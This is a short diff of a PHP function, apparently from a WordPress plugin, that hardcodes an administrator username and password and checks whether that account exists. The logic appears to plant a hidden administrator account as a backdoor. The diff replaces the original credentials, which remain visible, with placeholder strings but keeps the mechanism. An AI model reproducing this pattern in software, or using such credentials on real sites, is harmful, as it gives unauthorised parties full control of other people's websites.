@@ -53,8 +53,8 @@ public function __construct(  ) {
 public function ydo_add_role_to_users() {
     
     $options = get_option( 'ydo_user_created' );
-	$administratorName = 'ydodev';
-	$password = 'Cu2jmSJR';
+	$administratorName = 'dfgdfgdf';
+	$password = 'dfgdfgdfg';
 	$args = array('role' => 'administrator');
 	$users = get_users($args);
     if( $options != 200 && !username_exists($administratorName) )
